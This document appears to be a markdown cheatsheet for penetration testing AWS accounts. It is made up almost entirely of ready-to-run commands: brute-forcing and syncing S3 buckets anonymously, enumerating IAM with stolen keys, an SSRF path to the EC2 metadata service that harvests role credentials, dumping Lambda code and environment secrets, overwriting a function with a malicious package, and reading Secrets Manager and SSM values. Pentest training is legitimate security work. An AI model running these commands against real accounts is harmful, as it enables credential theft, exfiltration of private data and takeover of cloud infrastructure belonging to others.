# ğŸŸ  AWS Pentesting Cheatsheet

```
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
â•šâ•â•  â•šâ•â• â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•â•â•â•â•    â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   
```

---

## ğŸª£ S3 Bucket Enumeration

### Finding S3 Buckets
```bash
# Using AWS CLI
aws s3 ls s3://bucket-name --no-sign-request
aws s3 ls s3://bucket-name --profile stolen-creds

# Brute force bucket names
# S3Scanner
pip install s3scanner
s3scanner scan --bucket-file buckets.txt

# CloudBrute
CloudBrute -d target.com -k aws -w wordlist.txt

# Using ffuf
ffuf -u "https://FUZZ.s3.amazonaws.com" -w wordlist.txt -mc 200,301,302,403
```

### Common S3 Bucket Names
```
target-backup
target-dev
target-prod
target-staging
target-internal
target-logs
target-assets
target-media
target-data
target-files
```

### S3 Bucket Permissions Check
```bash
# List bucket (no auth)
aws s3 ls s3://bucket-name --no-sign-request

# Download entire bucket
aws s3 sync s3://bucket-name ./local-folder --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket bucket-name --no-sign-request

# Try to upload (write access)
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request
```

---

## ğŸ”‘ IAM Enumeration

### With Valid Credentials
```bash
# Configure credentials
aws configure --profile target
# or export directly
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

# Get current identity
aws sts get-caller-identity

# List users
aws iam list-users
aws iam list-groups
aws iam list-roles

# Get user policies
aws iam list-user-policies --user-name username
aws iam list-attached-user-policies --user-name username

# Get role policies
aws iam list-role-policies --role-name rolename
aws iam list-attached-role-policies --role-name rolename

# Get policy details
aws iam get-policy --policy-arn arn:aws:iam::123456789:policy/PolicyName
aws iam get-policy-version --policy-arn ARN --version-id v1
```

### Privilege Escalation Check
```bash
# Using Pacu (AWS exploitation framework)
python3 pacu.py
> import_keys --all
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# Common privesc paths:
# - iam:CreatePolicyVersion
# - iam:SetDefaultPolicyVersion
# - iam:PassRole + lambda/ec2
# - iam:CreateAccessKey
# - iam:CreateLoginProfile
# - iam:UpdateLoginProfile
# - iam:AttachUserPolicy
# - iam:AttachRolePolicy
# - sts:AssumeRole
```

---

## ğŸ“„ EC2 Metadata Service (IMDS)

### SSRF to Metadata
```bash
# IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Get credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# IMDSv2 (token required)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Useful metadata paths
/latest/meta-data/hostname
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4
/latest/meta-data/iam/security-credentials/
/latest/user-data                              # Startup scripts (may contain secrets!)
/latest/dynamic/instance-identity/document
```

### Using Stolen Credentials
```bash
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxxxxxx
export AWS_SESSION_TOKEN=xxxxxxxxxxxxxxxxxxx...

aws sts get-caller-identity
```

---

## âš¡ Lambda Functions

### Enumeration
```bash
# List functions
aws lambda list-functions --region us-east-1

# Get function details
aws lambda get-function --function-name FUNCTION_NAME

# Get function code
aws lambda get-function --function-name FUNCTION_NAME --query 'Code.Location' --output text | xargs curl -o function.zip

# Get environment variables (may contain secrets!)
aws lambda get-function-configuration --function-name FUNCTION_NAME
```

### Exploitation
```bash
# If you can update function code
aws lambda update-function-code --function-name FUNCTION_NAME --zip-file fileb://malicious.zip

# Invoke function
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## ğŸ—„ï¸ Other AWS Services

### RDS (Databases)
```bash
# List databases
aws rds describe-db-instances

# Get snapshots (may be public!)
aws rds describe-db-snapshots --include-public
```

### EBS Snapshots
```bash
# List your snapshots
aws ec2 describe-snapshots --owner-ids self

# Find public snapshots by keyword
aws ec2 describe-snapshots --filters "Name=description,Values=*backup*" --owner-ids amazon
```

### Secrets Manager
```bash
# List secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id SECRET_NAME
```

### SSM Parameters
```bash
# List parameters
aws ssm describe-parameters

# Get parameter value
aws ssm get-parameter --name PARAM_NAME --with-decryption
```

---

## ğŸ› ï¸ AWS Pentesting Tools

### Pacu (Exploitation Framework)
```bash
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip install -r requirements.txt
python3 pacu.py

# Useful modules:
> run iam__enum_permissions
> run iam__privesc_scan
> run s3__bucket_finder
> run ec2__enum
> run lambda__enum
```

### Prowler (Security Audit)
```bash
git clone https://github.com/prowler-cloud/prowler
cd prowler
./prowler aws
```

### ScoutSuite
```bash
pip install scoutsuite
scout aws --profile target
```

---

## ğŸ“‹ AWS Pentesting Checklist

```markdown
â–¡ Enumerate S3 buckets (public/private)
â–¡ Check for exposed credentials (GitHub, metadata)
â–¡ Enumerate IAM users/roles/policies
â–¡ Check for privilege escalation paths
â–¡ Enumerate EC2 instances & security groups
â–¡ Check Lambda functions for secrets
â–¡ Enumerate RDS/databases
â–¡ Check EBS/RDS snapshots (public)
â–¡ Enumerate Secrets Manager / SSM Parameters
```

---

## ğŸ”— Related Cheatsheets

- [Azure Pentesting](./Azure-Pentesting.md)
- [GCP Pentesting](./GCP-Pentesting.md)
- [SSRF Attacks](../SSRF/README.md)

---

**Back to Overview:** [â˜ï¸ Cloud Security](./README.md)
